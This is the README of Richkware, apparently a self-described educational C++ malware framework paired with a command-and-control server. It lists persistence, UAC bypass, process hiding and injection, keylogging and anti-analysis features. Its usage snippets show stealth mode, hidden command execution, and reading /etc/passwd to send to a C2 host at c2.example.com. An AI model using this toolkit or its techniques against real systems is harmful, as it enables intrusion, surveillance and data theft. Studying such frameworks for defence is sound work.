# Richkware

[![CI](https://github.com/richkmeli/Richkware/actions/workflows/ci.yml/badge.svg)](https://github.com/richkmeli/Richkware/actions/workflows/ci.yml)
[![Build status](https://ci.appveyor.com/api/projects/status/1tn6vedeaq0v27ra?svg=true)](https://ci.appveyor.com/project/richkmeli/richkware)
[![Codacy Badge](https://api.codacy.com/project/badge/Grade/d0698be43d9044c3839f11f3817d42c3)](https://app.codacy.com/gh/richkmeli/Richkware?utm_source=github.com&utm_medium=referral&utm_content=richkmeli/Richkware&utm_campaign=Badge_Grade)

**Richkware** is a modern C++20 framework for building educational malware agents. It provides a comprehensive, secure, and modular architecture for understanding malware mechanics and cybersecurity defense strategies.

> **Disclaimer / Ethical use**: This project is intended **only** for educational and research purposes. Do not use the code to harm, compromise, or access systems without explicit permission. The author and contributors are not responsible for misuse.

## Architecture

Richkware features a modern modular architecture with the following components:

- **Core**: Agent management, configuration, and error handling
- **Crypto**: Modern cryptographic operations (AES-256-GCM, key derivation)
- **Network**: Secure C2 communications with TLS 1.3 support
- **System**: Persistence, privilege management, and stealth capabilities
- **Modules**: Command execution, file operations, and system control
- **Utils**: JSON parsing, logging framework, and helper functions

## System Overview

Richkware operates as part of a three-component ecosystem:

- **Richkware Agent** (this project): The C++ malware framework that runs on target systems
- **[Richkware-Manager-Server](https://github.com/richkmeli/Richkware-Manager-Server)** (RMS): Command and control server
- **[Richkware-Manager-Client](https://github.com/richkmeli/Richkware-Manager-Client)** (RMC): GUI client for operator interaction

![System Diagram](https://raw.githubusercontent.com/richkmeli/richkmeli.github.io/master/Richkware/Diagram/RichkwareDiagram1.2.png)

## Documentation

|              | EN                          | IT                     |
|--------------|:----------------------------:|:----------------------:|
| Presentation | [PDF](https://github.com/richkmeli/Richkware/blob/master/docs/EN/Slide.pdf) | [PDF](https://github.com/richkmeli/Richkware/blob/master/docs/IT/Slide.pdf) |
| Report       | [PDF](https://github.com/richkmeli/Richkware/blob/master/docs/EN/Report.pdf)  | [PDF](https://github.com/richkmeli/Richkware/blob/master/docs/IT/Relazione.pdf) |

## Features

### Core Capabilities
- **Modern C++20**: Uses latest C++ standards with concepts, coroutines, and smart pointers
- **Memory Safety**: RAII principles, smart pointers, and bounds checking
- **Type Safety**: Strong typing with std::expected for error handling
- **Thread Safety**: Concurrent operations with proper synchronization

### Security
- **AES-256-GCM Encryption**: Modern authenticated encryption
- **TLS 1.3 Communications**: Secure C2 channel with certificate pinning
- **Key Derivation**: PBKDF2/Argon2 for secure key generation
- **Secure Random**: Cryptographically secure random number generation

### System Integration
- **Multi-Method Persistence**: Registry, services, scheduled tasks, WMI
- **Privilege Management**: UAC bypass and privilege escalation
- **Stealth Operations**: Process hiding and anti-analysis techniques
- **Command Execution**: Multiple backends (CMD, PowerShell, WMI)

### Network Operations
- **Asynchronous I/O**: Non-blocking network operations
- **HTTP/HTTPS Client**: Modern HTTP client with connection pooling
- **C2 Protocol**: Encrypted command and control communications
- **Resilient Connections**: Automatic retry and failover logic

### File Operations
- **File Management**: Read, write, delete, and search files
- **Directory Listing**: Browse filesystem with metadata
- **Exfiltration Support**: Encrypted file upload/download
- **Pattern Matching**: Wildcard-based file searching

### Utilities
- **Advanced JSON**: Complete JSON parser/serializer with object/array support
- **Logging Framework**: Thread-safe logging with multiple levels
- **Error Handling**: Consistent Result<T> pattern throughout

## CI/CD

Richkware uses multiple CI systems for comprehensive testing:

- **GitHub Actions**: Primary CI with Linux, Windows, and macOS builds
- **AppVeyor**: Legacy Windows CI with MSVC and MinGW support

### Build Status
- **GitHub Actions**: ![CI](https://github.com/richkmeli/Richkware/actions/workflows/ci.yml/badge.svg)
- **AppVeyor**: ![Build status](https://ci.appveyor.com/api/projects/status/1tn6vedeaq0v27ra?svg=true)

## Requirements

To build and use **Richkware**, you need:

- **CMake 3.20+**
- **C++20** compliant compiler:
  - **MSVC 2022+** (Visual Studio 2022)
  - **GCC 11+**
  - **Clang 13+**
- **OpenSSL 3.0+** (for cryptographic operations)
- **Google Test** (for unit testing, optional)

### Platform Support
- **Windows 10+**: Full support (MSVC + MinGW)
- **Linux**: Full support (GCC + Clang)
- **macOS**: Full support (Clang)
- **Cross-compilation**: MinGW-w64 for Windows targets from Linux

## Getting Started

### Basic Usage

```cpp
#include <richkware/core/agent.hpp>

int main() {
    // Configure agent
    richkware::core::Config config{
        .app_name = "MyAgent",
        .encryption_key = "secure_key_here",
        .server_address = "127.0.0.1",
        .server_port = 8443,
        .user_id = "agent_001",
        .enable_encryption = true,
        .enable_stealth = true
    };
    
    // Create and initialize agent
    richkware::core::Agent agent(std::move(config));
    
    if (auto result = agent.initialize(); !result) {
        return 1;
    }
    
    // Start agent operations
    if (auto result = agent.start(); !result) {
        return 1;
    }
    
    // Agent runs in background threads
    while (agent.is_running()) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
    
    return 0;
}
```

### Configuration Options

The agent can be configured through:
- **Code**: Direct configuration in source
- **Environment Variables**: Runtime configuration
- **JSON/YAML Files**: External configuration files

## Compilation

### Quick Build Scripts (Recommended)

For interactive build configuration, use the provided scripts:

**Linux/macOS:**
```bash
./build.sh
```

**Windows:**
```cmd
build.bat
```

The scripts will prompt you for:
- Target platform (current, Linux, Windows, macOS)
- Build type (Release/Debug)
- Optional features (tests, sanitizers, coverage)

### Using CMake Directly

```bash
# Create build directory
mkdir build && cd build

# Configure build
cmake .. -DCMAKE_BUILD_TYPE=Release

# Build project
cmake --build . --config Release

# Run tests (optional)
ctest
```

### Build Options

```bash
# Enable testing
cmake .. -DRICHKWARE_BUILD_TESTS=ON

# Enable examples
cmake .. -DRICHKWARE_BUILD_EXAMPLES=ON

# Enable AddressSanitizer
cmake .. -DRICHKWARE_ENABLE_ASAN=ON

# Cross-compile for Windows
cmake .. -DCMAKE_TOOLCHAIN_FILE=cmake/mingw-w64.cmake
```

### Dependencies Installation

#### Ubuntu/Debian
```bash
sudo apt update
sudo apt install build-essential cmake libssl-dev libgtest-dev
```

#### Windows (vcpkg)
```bash
vcpkg install openssl gtest
cmake .. -DCMAKE_TOOLCHAIN_FILE=[vcpkg root]/scripts/buildsystems/vcpkg.cmake
```

## Usage Examples

### Command Execution

```cpp
// Execute command synchronously
auto result = agent.execute_command("whoami");
if (result) {
    std::cout << "Output: " << result.value() << std::endl;
}

// Execute with custom options
richkware::modules::ExecutionOptions options{
    .timeout = std::chrono::seconds(10),
    .run_hidden = true
};

auto cmd_result = command_executor.execute("dir C:\\", options);
```

### Stealth Operations

```cpp
// Enable stealth mode
agent.enable_stealth();

// Hide specific windows
stealth_manager.hide_window("Calculator");

// Set as critical process
stealth_manager.set_critical_process(true);
```

### Persistence

```cpp
// Install persistence
persistence_manager.install_persistence();

// Check if persistence is active
if (persistence_manager.has_persistence()) {
    std::cout << "Persistence active" << std::endl;
}
```

### Secure Communications

```cpp
// Configure secure C2 channel
richkware::network::NetworkClient client(
    "c2.example.com", 443, "encryption_key", true
);

// Send encrypted data
c2_protocol.send_response({
    .command_id = "cmd_123",
    .success = true,
    .output = "Command executed successfully"
});
```

### File Operations

```cpp
// List directory contents
auto files = file_manager.list_directory("/tmp");
if (files) {
    for (const auto& file : files.value()) {
        LOG_INFO("File: {} ({} bytes)", file.name, file.size);
    }
}

// Read and encrypt a file
auto content = file_manager.read_file("/etc/passwd");
if (content) {
    // Encrypt content
    auto encrypted = cipher.encrypt_string(std::string(content.value().begin(), content.value().end()));
    // Send to C2 server...
}
```

### Logging

```cpp
// Use the logging framework
LOG_INFO("Agent started successfully");
LOG_ERROR("Failed to connect to C2 server: {}", error_msg);
LOG_DEBUG("Processing command: {}", command_id);

// Configure log level
richkware::utils::Logger::getInstance().setLevel(richkware::utils::LogLevel::DEBUG);
```

## API Reference

### Core Components

#### Agent
```cpp
richkware::core::Agent agent(config);
agent.initialize();
agent.start();
auto result = agent.execute_command("whoami");
```

#### File Manager
```cpp
richkware::modules::FileManager file_manager;
auto files = file_manager.list_directory("/path/to/dir");
auto content = file_manager.read_file("/path/to/file");
file_manager.write_file("/path/to/file", data);
```

#### Command Executor
```cpp
richkware::modules::CommandExecutor executor;
richkware::modules::ExecutionOptions opts{.timeout = std::chrono::seconds(30)};
auto result = executor.execute("ls -la", opts);
```

#### Cryptography
```cpp
richkware::crypto::CipherManager cipher;
cipher.set_password("my_key");
auto encrypted = cipher.encrypt_string("secret data");
auto decrypted = cipher.decrypt_string(encrypted.value());
```

#### JSON Utilities
```cpp
using nlohmann::json;
auto data = json::parse(R"({"key": "value"})");
std::string json_str = data.dump();
bool has_key = data.contains("key");
```

#### Logging
```cpp
LOG_INFO("Operation completed");
LOG_ERROR("Something went wrong: {}", error_details);
LOG_DEBUG("Detailed debug info");
```

## Testing

Richkware includes comprehensive unit and integration tests:

```bash
# Run all tests
ctest

# Run specific test suite
ctest -R crypto_tests

# Run with verbose output
ctest --verbose
```

## Contributing

Contributions are welcome! Please:

1. Follow the existing code style
2. Add tests for new functionality
3. Update documentation
4. Ensure all tests pass

## License

This project is licensed under the terms specified in the LICENSE file.

## Security Notice

**This software is for educational purposes only.** Using this software for unauthorized access to computer systems is illegal and unethical. The authors are not responsible for misuse of this software.

## Features

### Core Capabilities
- **Modern C++20**: Uses latest C++ standards with concepts, coroutines, and smart pointers
- **Memory Safety**: RAII principles, smart pointers, and bounds checking
- **Type Safety**: Strong typing with std::expected for error handling
- **Thread Safety**: Concurrent operations with proper synchronization

### Security
- **AES-256-GCM Encryption**: Modern authenticated encryption
- **TLS 1.3 Communications**: Secure C2 channel with certificate pinning
- **Key Derivation**: PBKDF2/Argon2 for secure key generation
- **Secure Random**: Cryptographically secure random number generation

### System Integration
- **Multi-Method Persistence**: Registry, services, scheduled tasks, WMI
- **Privilege Management**: UAC bypass and privilege escalation
- **Stealth Operations**: Process hiding and anti-analysis techniques
- **Command Execution**: Multiple backends (CMD, PowerShell, WMI)

### Network Operations
- **Asynchronous I/O**: Non-blocking network operations
- **HTTP/HTTPS Client**: Modern HTTP client with connection pooling
- **C2 Protocol**: Encrypted command and control communications
- **Resilient Connections**: Automatic retry and failover logic

### Advanced Modules
- **File Management**: Read, write, delete, and search files with encryption support
- **Keylogger**: Cross-platform keyboard input capture with real-time callbacks
- **Screenshot**: Screen capture for entire desktop or specific windows
- **Process Management**: Enumerate, start, terminate, and inject into processes
- **Anti-Analysis**: Detect debuggers, virtual machines, and sandbox environments
- **Self-Deletion**: Secure agent removal and cleanup

### Utilities
- **Advanced JSON**: Complete JSON parser/serializer with object/array support
- **Logging Framework**: Thread-safe logging with multiple levels and timestamps
- **Error Handling**: Consistent Result<T> pattern throughout the codebase

## Related Projects

- **[Richkware-Manager-Server](https://github.com/richkmeli/Richkware-Manager-Server)**: C2 server for agent management
- **[Richkware-Manager-Client](https://github.com/richkmeli/Richkware-Manager-Client)**: GUI client for C2 operations
